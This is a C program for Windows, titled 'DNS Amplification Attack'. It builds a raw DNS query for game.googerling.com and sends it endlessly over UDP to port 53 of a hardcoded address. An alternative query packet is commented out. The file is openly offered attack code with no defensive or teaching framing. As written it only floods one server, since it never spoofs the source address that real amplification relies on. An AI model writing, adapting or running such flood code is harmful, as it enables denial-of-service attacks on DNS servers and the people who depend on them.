#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <WinSock2.h>

#define BUF_SIZE 30
void ErrorHandling(char *message);

int main(void)
{
	WSADATA wsaData;
	SOCKET sock;
	SOCKADDR_IN servAdr;
	char dns[37];

	printf("\n\n\n");
	printf("\t[ DNS Amplification Attack ]\n\n");

	printf("\tWSAStartup  ...\n");
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		ErrorHandling("WSAStartup() error!");

	printf("\tCreate Socket  ...\n");

	sock = socket(PF_INET, SOCK_DGRAM, 0);
	if (sock == INVALID_SOCKET)
		ErrorHandling("socket() error");

	memset(&servAdr, 0, sizeof(servAdr));
	servAdr.sin_family = AF_INET;
	servAdr.sin_addr.s_addr = inet_addr("1.234.83.38");
	servAdr.sin_port = htons(53);
	connect(sock, (SOCKADDR*)&servAdr, sizeof(servAdr));


	printf("\tCreate UDP Packet  ...\n\n");

	/////////////////* game.googerling.com Packet */////////////////
	dns[0] = (int)0x00; // Header
	dns[1] = (int)0x19;
	dns[2] = (int)0x01;
	dns[3] = (int)0x00;
	dns[4] = (int)0x00;
	dns[5] = (int)0x01;
	dns[6] = (int)0x00;
	dns[7] = (int)0x00;
	dns[8] = (int)0x00;
	dns[9] = (int)0x00;
	dns[10] = (int)0x00;
	dns[11] = (int)0x00;
	dns[12] = (int)0x04; // Query Start
	dns[13] = 'g';
	dns[14] = 'a';
	dns[15] = 'm';
	dns[16] = 'e';
	dns[17] = (int)0x0a;
	dns[18] = 'g';
	dns[19] = 'o';
	dns[20] = 'o';
	dns[21] = 'g';
	dns[22] = 'e';
	dns[23] = 'r';
	dns[24] = 'l';
	dns[25] = 'i';
	dns[26] = 'n';
	dns[27] = 'g';
	dns[28] = (int)0x03;
	dns[29] = 'c';
	dns[30] = 'o';
	dns[31] = 'm';
	dns[32] = (int)0x00; // Query End
	dns[33] = (int)0x00;
	dns[34] = (int)0x01;
	dns[35] = (int)0x00;
	dns[36] = (int)0x01;
	////////////////////////////////////////////////////////////////


	/////////////////* googerling.com Packet */////////////////
	/*
	dns[0] = (int)0x00; // Header
	dns[1] = (int)0x19;
	dns[2] = (int)0x01;
	dns[3] = (int)0x00;
	dns[4] = (int)0x00;
	dns[5] = (int)0x01;
	dns[6] = (int)0x00;
	dns[7] = (int)0x00;
	dns[8] = (int)0x00;
	dns[9] = (int)0x00;
	dns[10] = (int)0x00;
	dns[11] = (int)0x00;
	dns[12] = (int)0x0a; // Query Start
	dns[13] = 'g';
	dns[14] = 'o';
	dns[15] = 'o';
	dns[16] = 'g';
	dns[17] = 'e';
	dns[18] = 'r';
	dns[19] = 'l';
	dns[20] = 'i';
	dns[21] = 'n';
	dns[22] = 'g';
	dns[23] = (int)0x03;
	dns[24] = 'c';
	dns[25] = 'o';
	dns[26] = 'm';
	dns[27] = (int)0x00; // Query End
	dns[28] = (int)0x00;
	dns[29] = (int)0x01;
	dns[30] = (int)0x00;
	dns[31] = (int)0x01;
	*/
	///////////////////////////////////////////////////////////

	printf("\tSend Packet  ...\n\n");
	while (1){
		send(sock, dns, sizeof(dns), 0);
	}
	
	closesocket(sock);
	WSACleanup();
	return 0;
}

void ErrorHandling(char *message)
{
	fputs(message, stderr);
	fputc('\n', stderr);
	exit(1);
}